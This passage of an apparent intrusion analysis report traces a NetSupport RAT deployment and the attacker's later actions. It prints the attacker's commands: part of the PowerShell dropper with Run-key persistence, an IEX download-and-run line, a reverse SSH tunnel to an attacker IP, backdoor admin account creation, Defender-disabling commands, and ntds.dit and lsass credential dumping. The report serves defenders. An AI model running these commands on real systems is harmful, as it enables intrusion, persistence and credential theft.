-destination \"$fpath\\client32.ini\"\n    React -source ${File3} -destination \"$fpath\\HTCTL32.DLL\"\n    React -source ${File4} -destination \"$fpath\\msvcr100.dll\"\n    React -source ${File5} -destination \"$fpath\\nskbfltr.inf\"\n    React -source ${File6} -destination \"$fpath\\NSM.ini\"\n    React -source ${File7} -destination \"$fpath\\NSM.lic\"\n    React -source ${File8} -destination \"$fpath\\pcicapi.dll\"\n    React -source ${File9} -destination \"$fpath\\PCICHEK.DLL\"\n    React -source ${File10} -destination \"$fpath\\PCICL32.DLL\"\n    React -source ${File11} -destination \"$fpath\\$remcmdstub\"\n    React -source ${File12} -destination \"$fpath\\TCCTL32.DLL\"\n\n    # Establish Persistance in Run Key\n    New-ItemProperty -Path \"$reg_key\" -Name \"$reg_name\" -Value \"$fpath\\$clientname\"  -PropertyType \"String\"\n\n    # Start NetSupport\n    Start-Process \"$fpath\\$clientname\"\n\n    # Remove Files\n    ${F}= Get-Content \"$env:temp\\insghha4.txt\"\n    Remove-Item $env:TEMP\\*.ps1\n    Remove-Item ${F}\n}\n\n###########################################################\n## Begin Execution Here By Invoking the Install Function ##\n###########################################################\nInstall\n```\n\nThe NetSupport deployment script takes the following steps:\n\n1. Check the execution name of the script against a list of filenames, if any match the script will exit.\n   - The names checked include avast, avg, sample, analysis, malware, sandbox, and virus.\n2. All the required files for the NetSupport deployment are packaged inside the deployment script. All these files will be extracted into a randomly named folder under the users `%APPDATA%` directory.\n   - The randomly named folder will be a combination of 8 randomly generated letters and numbers, such as `%APPDATA\\8EDX3iOx` or `%APPDATA%\\KcEwrg3X`.\n3. The NetSupport executable will be added to the Registry Run Key for persistence.\n4. The NetSupport executable will then be invoked to begin execution.\n\n```image\nAlt: NetSupport Deployment\nDescription: The image is a flowchart illustrating the process of deploying NetSupport via a JavaScript file. It outlines the steps taken after the PowerShell script is invoked, including downloading the NetSupport deployment script, dropping files in the user's %APPDATA% directory, establishing persistence through the Registry Run Key, and launching the NetSupport executable. Key actions and their corresponding outcomes are visually represented with arrows connecting each step, providing a clear overview of the deployment sequence.\nTranscription: |\n  From JavaScript to NetSupport Deployment\n  ------------------------------------------------\n  PowerShell Invoked\n  - PowerShell Invokes NetSupport Deployment Script in Memory\n  - NetSupport Files Dropped Under Path in User's %APPDATA%\n  - NetSupport Persistence Established via Run Key\n  - NetSupport Launched\n  \n  http://total[.]com/index.php\n  - IEX (New-Object Net.Webclient). downloadstring(\"http://total.com/index.php\")\n  \n  Registry Entry:\n  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n  - C:\\Users\\[REDACTED]\\AppData\\Roaming\\eHNjgZ\\presentationhost.exe\n```\n\nThe NetSupport script creates all required files in the `%APPDATA%` folder.\n\n```image\nAlt: NetSupport Files\nDescription: The image displays a file directory structure showing various files located in the '%APPDATA%' folder of a Windows machine. The folder name is a randomly generated string 'eHNjqgZ', which aligns with the behavior described for the NetSupport deployment script. The list includes several DLL files, configuration files, and an executable named 'presentationhost.exe', indicating that these files are part of the NetSupport deployment package.\nTranscription: |\n  Name                    Type                      Size\n  client32.ini            Configuration settings    1 KB\n  HTCTL32.DLL             Application extension     321 KB\n  msvcr100.dll            Application extension     756 KB\n  nskbfltr.inf            Setup Information         1 KB\n  NSM.ini                 Configuration settings    7 KB\n  NSM.lic                 LIC File                  1 KB\n  pcicapi.dll             Application extension     33 KB\n  PICICHEK.DLL            Application extension     19 KB\n  PCICL32.DLL             Application extension     3,653 KB\n  presentationhost.exe    Application               110 KB\n  remcmdstub.exe          Application               63 KB\n  TCCTL32.DLL             Application extension     388 KB\n```\n\nIn addition, an entry was added to `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` for `presentationhost.exe` (NetSupport) to facilitate persistence on the machine.\n\n```image\nAlt: Registry Entry\nDescription: The image displays a table showing registry values on a Windows system. It includes columns for 'Value Name', 'Value Type', and 'Data', highlighting entries related to 'OneDrive' and 'SoftwareUpdater'. The 'SoftwareUpdater' entry is particularly significant as it indicates the path to the 'presentationhost.exe' executable located in a randomly named folder in the '%APPDATA%' directory, which is part of the NetSupport deployment process.\nTranscription: |\n  Values\n  | Value Name      | Value Type | Data                                                                        |\n  | --------------- | ---------- | --------------------------------------------------------------------------- |\n  | OneDrive        | RegSz      | \"C:\\Users\\<User>\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background |\n  | SoftwareUpdater | RegSz      | \"C:\\Users\\<User>\\AppData\\Roaming\\<RandomFolder>\\presentationhost.exe\"       |\n```\n\nLastly, the PowerShell script will finish by invoking the NetSupport executable directly.\n\n```image\nAlt: NetSupport Invocation\nDescription: The image displays a log entry related to a PowerShell command execution. It shows details from the Sysmon logs, specifically the channel 'Microsoft-Windows-Sysmon/Operational'. The log entry includes the event ID and the command line used during the execution of a PowerShell process. The command appears to be obfuscated and is running a script that eventually leads to the execution of 'presentationhost.exe' located in a randomized folder within the user's AppData directory. This context aligns with the NetSupport deployment described in the accompanying paragraph.\nTranscription: |\n  winlog.channel: Microsoft-Windows-Symon/Operational\n  winlog.event_id: 1\n  process.parent.command_line: Powershell -nop -w hidden -ep bypass -enC SQBFAFgAIAAAE4AZQB3ACATwB1AGoQAIABOAGU...\n  process.command_line: \"C:\\Users\\username\\AppData\\Roaming\\elHNjgzZ\\presentationhost.exe\"\n```\n\n### Batch Script Automation\n\nThe threat actor was observed making use of Batch scripts to automate some of their tasks, such as executing discovery programs, dumping credentials, and establishing persistence.\n\n```image\nAlt: Batch Script\nDescription: The image displays two batch script files, 'start.bat' and 'install.bat,' open in a code editor. The 'start.bat' script contains commands to change directory to 'C:\\ProgramData\\' and execute 'pingcastle.exe' with specific parameters, redirecting output to 'process.log.' The 'install.bat' script includes commands for generating SSH keys, setting file permissions using 'icacls,' and scheduling tasks with 'schtasks.exe' to run SSH server and key exchange processes at specified intervals.\nTranscription: |\n  start.bat\n  1  cd C:\\ProgramData\\\n  2  pingcastle.exe --healthcheck --level Full > process.log 2>&1\n  3  exit\n  \n  install.bat\n  1  @echo off\n  2  ssh-keygen -f %programdata%\\sshd\\config\\id_rsa -t rsa -N \"\"\n  3  icacls %programdata%\\sshd\\config\\keys\\id_rsa /inheritance:r\n  4  icacls %programdata%\\sshd\\config\\keys\\id_rsa /grant:r \"%username%\":\"(R)\"\n  5  icacls %programdata%\\sshd\\config\\id_rsa /inheritance:r\n  6  icacls %programdata%\\sshd\\config\\id_rsa /grant:r \"%username%\":\"(R)\"\n  7  schtasks.exe /create /sc minute /mo 1 /tn \"SSH Server\" /rl highest /tr \"%programdata%\\sshd\\sshd.exe\"\n  8  schtasks.exe /create /sc minute /mo 1 /tn \"SSH Key Exchange\" /rl highest /tr \"%programdata%\\sshd\\ssh.exe\"\n  \n  ntds.bat\n  1  powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\ProgramData\\ntdsutil' q q\"\n```\n\n## Persistence\n\nDuring the beginning stages of the intrusion, the NetSupport deployment script was used to establish persistence using the Run key under the user registry hive. For more details, see the Execution section.\n\n```image\nAlt: Registry Persistence\nDescription: The image displays a section of PowerShell code related to establishing persistence in a Windows environment. It shows the definition of registry path variables for persistence, specifically targeting the 'Run' key in the Windows registry. The code includes commands to create a new item property in the specified registry path, which is likely used to automatically execute a program during system startup.\nTranscription: |\n  # Registry Path Variables for Persistence, these are written to towards the end of the script.\n  [string] ${reg_key} = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n  [string] ${reg_name} = \"SoftwareUpdater\"\n  \n  # Establish Persistence in Run Key\n  New-ItemProperty -Path \"$reg_key\" -Name \"$reg_name\" -Value \"$fpath\\$clientname\" -PropertyType \"String\"\n```\n\nSince the deployment script was PowerShell based, the source process of the registry activity will appear as `powershell.exe`.\n\n```image\nAlt: PowerShell Registry\nDescription: The image displays a structured log entry related to a registry event in a cybersecurity context. It includes columns such as 'event.provider,' 'event.code,' 'event.action,' 'process.executable,' 'registry.path,' 'registry.value,' and 'log.event_data.Details.' Specific details indicate that a registry value was set, pointing to a scheduled task or persistence mechanism involving 'powershell.exe' and a registry path associated with software execution on a Windows system.\nTranscription: |\n  event.provider: Microsoft-Windows-Symon\n  event.code: 13\n  event.action: Registry value set (rule: RegistryEvent)\n  process.executable: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  registry.path: HKU\\S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SoftwareUpdater\n  registry.value: SoftwareUpdater\n  wlog.event_data.Details: C:\\Users\\username\\AppData\\Roaming\\eHNjggZ\\presentationhost.exe\n```\n\nIn addition, a scheduled task was created to launch OpenSSH SSH Server with a specific configuration altered to make OpenSSH listen locally on port 2222 instead of 22.\n\n```\nschtasks.exe /create /sc minute /mo 1 /tn \"SSH Server\" /rl highest /tr \"C:\\ProgramData\\sshd\\sshd.exe -f C:\\ProgramData\\sshd\\config\\sshd_config\"\n```\n\nFollowing the previous command, another scheduled task was created to establish a reverse SSH tunnel to the attacker’s server. See the lateral movement section to understand how this aided the attacker’s activities.\n\n```\nschtasks.exe /create /sc minute /mo 1 /tn \"SSH Key Exchange\" /rl highest /tr \"C:\\ProgramData\\sshd\\ssh.exe -i C:\\ProgramData\\sshd\\config\\keys\\id_rsa -N -R 369:127.0.0.1:2222 root@185.206.146.129 -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15\"\n```\n\nThe entire process related to OpenSSH and its persistence was automated by the threat actors through a script named `install.bat`. In this case, the script generated a new private key using `ssh-keygen` and corrected the permissions on the file using `icacls`; this is required because if the permissions are too open on the private key, SSH will exit with an error. More details regarding the SSH tunneling command executed within the scheduled task can be seen under the Command and Control section.\n\n```image\nAlt: SSH Keygen\nDescription: The image shows a snippet of a batch script named 'install.bat' displayed in a code editor. The script contains commands related to the generation and management of SSH keys, setting permissions with 'icacls', and creating scheduled tasks for an SSH server and key exchange. The commands indicate an automated process for establishing persistence and facilitating SSH connections for potential unauthorized access.\nTranscription: |\n  @echo off\n  ssh-keygen -f %programdata%\\sshd\\config\\id_rsa -t rsa -N \"\"\n  icacls %programdata%\\sshd\\config\\keys\\id_rsa /inheritance:r\n  icacls %programdata%\\sshd\\config\\keys\\id_rsa /grant:r \"%username%\":\"(R)\"\n  icacls %programdata%\\sshd\\config\\id_rsa /inheritance:r\n  schtasks.exe /create /sc minute /mo 1 /tn \"SSH Server\" /rl highest /tr \"%programdata%\\sshd\\sshd.exe -f %programdata%\\sshd\\config\\sshd_config\"\n  schtasks.exe /create /sc minute /mo 1 /tn \"SSH Key Exchange\" /rl highest /tr \"%programdata%\\sshd\\ssh.exe -i %programdata%\\sshd\\config\\keys\\id_rsa -N -R 369:127.0.0.1:2222 root@185.206.146.129 -o StrictHostKeyChecking=no\"\n```\n\nThe threat actor created a local user account and added the user to the Administrators and Remote Desktop Users groups. The newly created user account was named `WDAGUtilityAccount2` to blend in with the default user account `WDAGUtilityAccount` present on Windows.\n\n```\nnet  user WDAGUtilityAccount2 Decryptme1488@ /add\nnet  localgroup Administrators WDAGUtilityAccount2 /add\nnet  localgroup \"Remote Desktop Users\" WDAGUtilityAccount2 /add\n```\n\nLastly, the threat actor made use of NIM based tools to authenticate via pass-the-hash and to create a new local administrator user.\n\n```image\nAlt: NIM Tools\nDescription: The image displays a table containing event logs related to process executions. It includes columns for 'event.provider', 'event.code', 'process.parent.command_line', and 'process.command_line'. The data shows two entries from 'Microsoft-Windows-Sysmon', detailing commands executed by 'cmd.exe' that are associated with user account manipulation via 'pth_createuser.exe' and 'pth_addadmin.exe', indicating activities related to pass-the-hash techniques.\nTranscription: |\n  | event.provider           | event.code | process.parent.command_line | process.command_line                                  |\n  | ------------------------ | ---------- | --------------------------- | ----------------------------------------------------- |\n  | Microsoft-Windows-Sysmon | 1          | C:\\Windows\\system32\\cmd.exe | pth_createuser.exe --ip= --domain --username= --hash= |\n  | Microsoft-Windows-Sysmon | 1          | C:\\Windows\\system32\\cmd.exe | pth_addadmin.exe --ip= --domain --username= --hash=   |\n```\n\nThe following demonstrates the possible command line parameters of this tool.\n\n```image\nAlt: NIM Command\nDescription: The image displays a command-line interface showing the usage options for a tool named 'pth_addadmin.exe'. It outlines various command-line options available for the tool, including flags for help, IP address, domain, username, and hash. This information is relevant for understanding how the tool can be used to manage user accounts, particularly in the context of pass-the-hash attacks.\nTranscription: |\n  λ pth_addadmin.exe -h\n  pth_addadmin.exe\n  Usage:\n    [options]\n  \n  Options:\n    -h, --help\n    -i, --ip=IP\n    -d, --domain=DOMAIN\n    -u, --username=USERNAME\n    -h, --hash=HASH\n```\n\n```image\nAlt: NIM Command\nDescription: The image shows a command-line interface displaying the usage instructions and options for a tool named `pth_createuser.exe`. The options include flags for help, IP, domain, username, and hash. This is likely related to a technique for creating user accounts through pass-the-hash methods in a cybersecurity context.\nTranscription: |\n  λ pth_createuser.exe -h\n  pth_createuser.exe\n  Usage:\n      [options]\n  \n  Options:\n      -h, --help\n      -i, --ip=IP\n      -d, --domain=DOMAIN\n      -u, --username=USERNAME\n      -h, --hash=HASH\n```\n\nLooking at the strings present in the files we can discover that these are compiled NIM binaries.\n\n```image\nAlt: NIM Strings\nDescription: The image displays a detailed table that outlines various properties of files related to a cybersecurity context. It includes columns such as 'encoding', 'size (bytes)', 'location', 'flag', 'label', 'group', 'technique', and 'value'. Notably, several entries are highlighted in red, suggesting they are of particular interest or relevance, such as 'fatal.nim', 'options.nim', and 'oserr.nim'. This table likely serves to provide insights into the file structures or behaviors of certain NIM binaries used in a cyber threat scenario.\nTranscription: |\n  | encoding (2) | size (bytes) | location | flag (24) | label (253) | group (12) | technique (8) | value (11024)      |\n  | ------------ | ------------ | -------- | --------- | ----------- | ---------- | ------------- | ------------------ |\n  | ascii        | 3            | .text    | -         | file        | -          | -             | t.H                |\n  | ascii        | 18           | .rdata   | -         | file        | -          | -             | fatal.nim          |\n  | ascii        | 6            | .rdata   | -         | file        | -          | -             | io.nim             |\n  | ascii        | 6            | .rdata   | -         | file        | -          | -             | fatal.nim          |\n  | ascii        | 11           | .rdata   | -         | file        | -          | -             | parseutils.nim     |\n  | ascii        | 9            | .rdata   | -         | file        | -          | -             | strutils.nim       |\n  | ascii        | 11           | .rdata   | -         | file        | -          | -             | streams.nim        |\n  | ascii        | 6            | .rdata   | -         | file        | -          | -             | @Ws2_32.dll        |\n  | ascii        | 6            | .rdata   | -         | file        | -          | -             | @Ws2_32.dll        |\n  | ascii        | 7            | .rdata   | -         | file        | -          | -             | oserr.nim          |\n  | ascii        | 11           | .rdata   | -         | file        | -          | -             | os.nim             |\n  | ascii        | 6            | .rdata   | -         | file        | -          | -             | net.nim            |\n  | ascii        | 11           | .rdata   | -         | file        | -          | -             | @Bcrypt.dll        |\n  | ascii        | 7            | .rdata   | -         | file        | -          | -             | @Bcrypt.dll        |\n  | ascii        | 6            | .rdata   | -         | file        | -          | -             | o.h                |\n  | ascii        | 12           | .idata   | -         | file        | -          | -             | options.nim        |\n  | ascii        | 18           | overlay  | -         | file        | -          | -             | backend.nim        |\n  | ascii        | 25           | .29      | -         | file        | -          | -             | KERNEL32.dll       |\n  | ascii        | 6            | .55      | -         | file        | -          | -             | msvcrt.dll         |\n  | ascii        | 6            | .55      | -         | file        | -          | -             | i386.h             |\n  | ascii        | 20           | overlay  | -         | file        | -          | -             | gbl-ctors.h        |\n  | ascii        | 18           | overlay  | -         | file        | -          | -             | libgcc2.c          |\n  | ascii        | 15           | overlay  | -         | file        | -          | -             | crtexe.c           |\n  | ascii        | 17           | overlay  | -         | file        | -          | -             | cygming-crtbegin.c |\n  | ascii        | 16           | overlay  | -         | file        | -          | -             | rhash_md4.c        |\n  | ascii        | 16           | overlay  | -         | file        | -          | -             | stdlib_io.nim.c    |\n  | ascii        | 18           | overlay  | -         | file        | -          | -             | stdlib_math.nim.c  |\n  | ascii        | 16           | overlay  | -         | file        | -          | -             | stdlib_times.nim.c |\n  | ascii        | 16           | overlay  | -         | file        | -          | -             | stdlib_os.nim.c    |\n  | ascii        | 16           | overlay  | -         | file        | -          | -             | stdlib_sets.nim.c  |\n  | ascii        | 16           | overlay  | -         | file        | -          | -             | stdlib_net.nim.c   |\n  | ascii        | 16           | overlay  | -         | file        | -          | -             | stdlib_md5.nim.c   |\n  | ascii        | 11           | overlay  | -         | file        | -          | -             | @mpth.nim.c        |\n```\n\nSifting further through the strings, we stumble on the command used to create the user account.\n\n```image\nAlt: User Account Command\nDescription: The image displays a snippet from a disassembled binary or a debugger output, showcasing strings related to user account creation commands. It includes lines with ASCII representations, highlighting the command used to add a new user account ('net user localend Decryptme7 /add'). The format suggests that this is part of an analysis of malware or a cyber threat, revealing the underlying commands executed during an intrusion.\nTranscription: |\n  | ascii | 13 | .rdata | - | format-string | - |\n  | ascii | 49 | .rdata | - | format-string | - | @%COMSPEC% /C \"net user localend Decryptme7 /add\" |\n  | ascii | 41 | .rdata | - | format-string | - | _mather(); %s in %s(%g, %g) (retval=%g) |\n```\n\n```\n@%COMSPEC% /C \"net user localend Decryptme7 /add\"\n```\n\nWe can also see the command that was used to attempt to add the user to the administrators group.\n\n```image\nAlt: Add User Command\nDescription: The image displays a section of code or output related to a scripting or programming context. It includes lines of code that appear to be related to user account management in a Windows environment, specifically commands utilizing `net user` and `net localgroup` commands. The highlighted line indicates a command to add a user to the Administrators group, showcasing how commands are structured in a terminal or command-line interface.\nTranscription: |\n  @%COMSPEC% /C \"net user localend Decryptme7 /add\"\n  @%COMSPEC% /C \"net localgroup Administrators localend /add\"\n  _mather(); %s in %g, %g (retval=%g)\n```\n\nWe did not observe any backdoor account created after execution. When we performed our own testing, we saw the tools failed to work and would return an error rather than create an account.\n\n## Defense Evasion\n\nDuring this intrusion, the threat actor was primarily concerned with evading detection by Microsoft Defender. This can be seen multiple times throughout the intrusion where the threat actor checked the historical alerts from Defender using `powershell Get-MpThreat` after conducting credential harvesting or lateral movement actions.\n\nDuring the intrusion, we observed multiple attempts to add exclusions and ultimately trying to disable the local Defender using below commands. The threat actor made several typos during the command execution, indicating a hands-on approach rather than a scripted one.\n\n```\npowershell  Get-MpThreat\npowershell  Get-MpPreference\npowershell  Add-MpPreference -ExclustionPath c:\\users\\public\npowershell  Add-MpPreference -ExclusionPath c:\\users\\public\npowershell  Add-MpPreference -ExclusionProcess c:\\users\\public\\mpms.exe\npowershell  Add-MpPreference -DisableBehaviourMonitoring True\npowershell  Add-MpPreference -DisableBehaviorMonitoring True\npowershell  Add-MpPreference -DisDisableRealtimeMonitoring True\n```\n\nThe mpms executable from the above commands was a renamed ProcDump binary. It was likely renamed in an attempt to avoid detection.\n\n```image\nAlt: ProcDump\nDescription: The image displays a detailed output from a process creation event related to the use of the ProcDump utility. Key information includes the technique ID (T1059), the UTC time of the event, process IDs, image path, and the command line used to execute the utility. It highlights important attributes such as the product ('ProcDump'), the company ('Sysinternals'), and the original file name, providing context on the usage of ProcDump in the intrusion scenario described. The output also indicates the user and session details, along with integrity level and hashes relevant for forensic analysis.\nTranscription: |\n  Process Create:\n  RuleName: technique_id=T1059, technique-name=Command-Line Interface\n  UtcTime:\n  ProcessGuid: {1dc91c81-57ba-63d3-2000-000000000000}\n  ProcessId: 38\n  Image: C:\\Users\\nmps.exe\n  FileVersion: 11.0\n  Description: Sysinternals process dump utility\n  Product: ProcDump\n  Company: Sysinternals - www.sysinternals.com\n  OriginalFileName: procdump\n  CommandLine: nmps.exe -acceptteula -ma 632\n  CurrentDirectory: c:\\Users\\\n  User:\n  LogonGuid: {1dc91c81-57ba-63d0-92e4-c73000000000}\n  LogonId: 0x37249E\n  TerminalSessionId: 0\n  IntegrityLevel: High\n  Hashes: SHA1=43EA521E04836361360C4DCA54B5F4B5D5=6B17C796D6...\n  ParentProcessGuid: {1dc91c81-043a-63d3-71d0-000000000000}\n  ParentProcessId: 1172\n  ParentImage: C:\\Windows\\System32\\cmd.exe\n  ParentCommandLine: C:\\Windows\\system32\\cmd.exe\n```\n\nAfter some activity, the threat actor entered the ‘Scans’ directory of Microsoft’s Defender software, located under:\n\n```\nC:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\\n```\n\nIn addition to checking the Windows Defender historical scan files, the threat actor once again used the `Get-MpThreat` Cmdlet to query the history of threats detected by Windows Defender.\n\nDuring the intrusion, the threat actor relied heavily on the toolkit **Impacket** (especially _atexec.py_ and _wmiexec_). To facilitate some of its capabilities, the host-based firewall was modified before the actual execution of atexec.py and wmiexec executions:\n\n```\ncmd.exe /C netsh advfirewall firewall add rule dir=in name=\"DCOM\" program=C:\\Windows\\system32\\svchost.exe service=rpcss action=allow protocol=TCP localport=135 > C:\\Windows\\Temp\\VlPWyecW.tmp 2>&1\ncmd.exe /C netsh advfirewall firewall add rule dir=in name=\"DCOM\" program=C:\\Windows\\system32\\svchost.exe service=rpcss action=allow protocol=TCP localport=135 > C:\\Windows\\Temp\\pOrnerOW.tmp 2>&1\ncmd.exe /C netsh advfirewall firewall add rule dir=in name =\"WMI\" program=C:\\Windows\\system32\\svchost.exe service=winmgmt action = allow protocol=TCP localport=any > C:\\Windows\\Temp\\XsssmLZZ.tmp 2>&1\ncmd.exe /C netsh advfirewall firewall add rule dir=in name =\"UnsecApp\" program=C:\\Windows\\system32\\wbem\\unsecapp.exe action=allow > C:\\Windows\\Temp\\HaALurWi.tmp 2>&1\ncmd.exe /C netsh advfirewall firewall add rule dir=out name =\"WMI_OUT\" program=C:\\Windows\\system32\\svchost.exe service=winmgmt action=allow protocol=TCP localport=any > C:\\Windows\\Temp\\WkiMfXXo.tmp 2>&1\n```\n\nMultiple times during the intrusion, the threat actor made use of cabinet files (.cab). These are archive files, which support lossless data compression. They are mainly used to distribute device drivers and system files. However, in this case, the actor used its functionality similarly to a traditional .zip archive and deployed its contents under the _programdata_ directory.\n\n```\ncmd.exe /Q /c expand cache.cab -F:* c:\\programdata\n```\n\nAfter decompression, we found a **NetSupport** executable disguised as a Windows component. The executable file was named `mswow86.exe`. The threat actor created a scheduled task to run the binary on every logon.\n\n```\ncmd.exe /Q /c start \"\" %%programdata%%\\schcache\\mswow86.exe\ncmd.exe /Q /c schtasks.exe /create /sc onlogon /tn \"Wow64 Subsystem\" /rl highest /tr \"%%programdata%%\\schcache\\mswow86.exe\n```\n\nAll the chosen names appear to represent a ‘legitimate’ Windows component:\n\n- The name for the executable (`mswow86.exe`)\n- The storage location of this executable (`%programdata%\\schache\\`)\n- The scheduled task name (`Wow64 Subsystem`)\n\n## Credential Access\n\nWe observed the threat actor dumping the **ntds.dit** database on two different domain controllers using a batch script, which then executed the command described in here:\n\n```\npowershell.exe  \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\users\\public\\ntds' q q\"\npowershell.exe  \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\ProgramData\\ntdsutil' q q\"\n```\n\nAs seen in the Defense Evasion section, the actor used the Sysinternals tool ProcDump. The threat actor executed a command to identify the PID of the lsass.exe process. This allowed them to target the correct process to dump lsass:\n\n```image\nAlt: ProcDump Command\nDescription: The image displays technical details related to the Windows 'find.exe' utility. It includes attributes such as the file path (C:\\Windows\\System32\\find.exe), a brief description of the utility (Find String (grep) Utility), product information (Microsoft Windows Operating System), and company details (Microsoft Corporation). Additionally, it shows the command line execution ('find /i \"lsas\"') and the current directory context (c:\\Users\\Public\\). This information is pertinent to understanding how the threat actor utilized the command in the context of credential access.\nTranscription: |\n  Image: C:\\Windows\\System32\\find.exe\n  FileVersion:\n  Description: Find String (grep) Utility\n  Product: Microsoft® Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: FIND.EXE\n  CommandLine: find /i \"lsas\"\n  CurrentDirectory: c:\\Users\\Public\\\n```\n\nIt appears this will not work, as there is no directory for the _find_ command, but the actor likely piped it together, as we saw execution of **tasklist** at the same time:\n\n```image\nAlt: Tasklist Command\nDescription: The image displays detailed properties of the 'tasklist.exe' executable file located in the 'C:\\Windows\\System32\\' directory. It includes metadata such as the file version, a description stating that it lists the current running tasks, product information indicating it is part of the Microsoft Windows Operating System, and the company as Microsoft Corporation. Additionally, the original file name and command line used to execute the file are also provided.\nTranscription: |\n  Image: C:\\Windows\\System32\\tasklist.exe\n  FileVersion:\n  Description: Lists the current running tasks\n  Product: Microsoft® Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: tasklist.exe\n  CommandLine: tasklist\n```\n\nThis is likely the result of executing something like the following (`tasklist | find /i \"lsas\"`):\n\n```image\nAlt: Tasklist Find\nDescription: The image shows a command line interface displaying the output of the command `tasklist | find /i \"lsas\"`. The output indicates that the `lsass.exe` process is running with a PID of 564, and it is using approximately 22.660 K of memory. This command is likely part of a technique used by a threat actor to identify the lsass.exe process for credential dumping.\nTranscription: |\n  C:\\> tasklist | find /i \"lsas\"\n  lsass.exe             564 Services                   0      22,660 K\n```\n\nUsing the renamed ProcDump utility, the threat actor dumps the **lsass.exe** process, which can be used to get more credential information:\n\n```\nmpms.exe  -accepteula -ma 632\nmpms.exe  -accepteula -ma 716\n```\n\n## Discovery\n\nThe attackers executed several familiar discovery commands on the targeted systems. These were related to the discovery of information on users, hosts and the network configuration. The threat actor connected via the NetSupport agent and then started running commands via a spawned instance of **cmd.exe**.\n\n```image\nAlt: Discovery Commands\nDescription: The image depicts a flowchart that outlines the connection between the NetSupport application (specifically 'presentationhost.exe') and the execution of discovery commands via 'cmd.exe'. It shows multiple instances of 'remcmdstub.exe' with different process IDs, indicating their relationship to the command line interface used for executing various discovery commands during a cyber intrusion. The flowchart visually represents how the NetSupport agent is leveraged by the threat actor to execute commands on the targeted system.\nTranscription: |\n  ┌──────────────────────────────────────────────────────────────┐\n  │                          NetSupport                          │\n  │                     (presentationhost.exe)                   │\n  ├──────────────────────────────────────────────────────────────┤\n  │ remcmdstub.exe 2544 2524 2556 2560 %COMSPEC%                 │\n  │ remcmdstub.exe 2320 2568 1528 2352 %COMSPEC%                 │\n  │ remcmdstub.exe 2344 2328 2356 2360 %COMSPEC%                 │\n  │                           cmd.exe                            │\n  │                          Discovery Commands                  │\n  └──────────────────────────────────────────────────────────────┘\n```\n\nBelow are the first batch of executed discovery commands observed. As seen during this entire intrusion, the threat actor makes small mistakes, either with typos or in command functionality:\n\n```\nwhoami\nnet user\nnet user /domain\nwhoami /all\nnet user <PRIV_ACCOUNT>\nnet group \"Domain Admins\" /domain\nsysteminfo\ncmdkey /list\n```\n\nWe observed the threat actor quickly query for a specific account. This account is a local admin and a domain admin. However, this account was not activated and the actor tried to enable it, making a few mistakes along the way:\n\n```\nnltest /dclist:<REDACTED>\ncmdkey /add:<DC_NAME> /user:<DOMAIN>\\<PRIV_ACC> /pass:REDACTED\nnet user <PRIV_ACC> /domain\nwhoami\nnet user <USER_ACCOUNT> /domain\ncmdkey /del:<DC_NAME>\ncmdkey /add:\"<DC_NAME>\" /user:<DC_NAME>\\<PRIV_ACC> /pass:REDACTED\ncmdkey /del:\"<DC_NAME>\"\nnet user <PRIV_ACCOUNT>\ncmdkey /add:\"<DC_NAME>\" /user:<DC_NAME>\\<PRIV_ACC> /pass:REDACTED\nnet user /add:\"<BEACHHOST>\" /user:<DOMAIN_NAME><PRIV_ACC>/pass:REDACTED\ncmdkey /list\ncmdkey /del:\"<DC_NAME>\"\ncmdkey /del:\"<BEACHHOST>\"\n```\n\nWe observe a couple of mistakes, as a result of hands-on activity and struggling to get things working:\n\n- The first _cmdkey_ is actually correct usage, however the account was not activated.\n- Using _/add_ requires the usage of domain credentials, not credentials of machine.\n- Adding quotes to a command, where it does not matter.\n\nAfter this endeavor, the threat actor tried elsewhere, looking around for interesting information related to the **SYSVOL** shares. Additionally, the actor looked for the presence of **SSH**. This was not installed on the system, so the threat actor installed their own SSH server, as can be seen under the PERSISTENCE section. Additionally, the threat actor tried his luck to find additional domain controllers:\n\n```\nnet view \\\\<DOMAIN_NAME>.local\nnet view \\\\<DOMAIN_NAME>.local\\sysvol\nnet view \\\\<DOMAIN_NAME>.local\\SYSVOL\nwhoami /all\ntasklist\nfind /i \"ssh\"\nping -n 1 <DOMAIN_NAME>.local\nping -n 1 <DC1>.<DOMAIN_NAME>.local\nping -n 1 <DC2>.<DOMAIN_NAME>.local\nping -n 1 <DC3>.<DOMAIN_NAME>.local\narp -a\nping -n 1 REDACTED\nping -n 1 -a REDACTED\nping -n 1 -a REDACTED\nping -n 1 -a REDACTED\nnet view REDACTED\n```\n\nIn addition to the recognizable atexec.py characteristics, this excellent read explains how to hunt for atexec.py in the Windows event logs:\n\n```\ncmd.exe /C net group /domain > C:\\Windows\\Temp\\aWatKmSa.tmp 2>&1\n```\n\nResulted in:\n\n```image\nAlt: Event Log\nDescription: The image displays a Windows Event Log entry related to the Task Scheduler. It indicates that a task identified by a unique GUID was launched by the user 'System'. The task is named '\\aWatKmSa', suggesting it may be part of a scheduled activity, possibly linked to the malicious actions described in the context.\nTranscription: |\n  Event 110, TaskScheduler\n  \n  General\n  Task Scheduler launched \"{41a2e59b-656e-4f99-bb3c-b3bfc5e77354}\" instance of task \"\\aWatKmSa\" for user \"system\".\n```\n\nand three seconds later in:\n\n```image\nAlt: Event Log\nDescription: The image displays an event log entry from the Windows Event Viewer, specifically Event ID 141 related to TaskScheduler. The log indicates that a user, identified as 'Administrator', deleted a Task Scheduler task named '\\aWatKmSa'. The entry is organized into two tabs: 'General' and 'Details', showing relevant information about the event.\nTranscription: |\n  Event 141, TaskScheduler\n  \n  General\n  User <REDACTED> \"Administrator\" deleted Task Scheduler task \"\\aWatKmSa\"\n```\n\nAfter this, wmiexec is 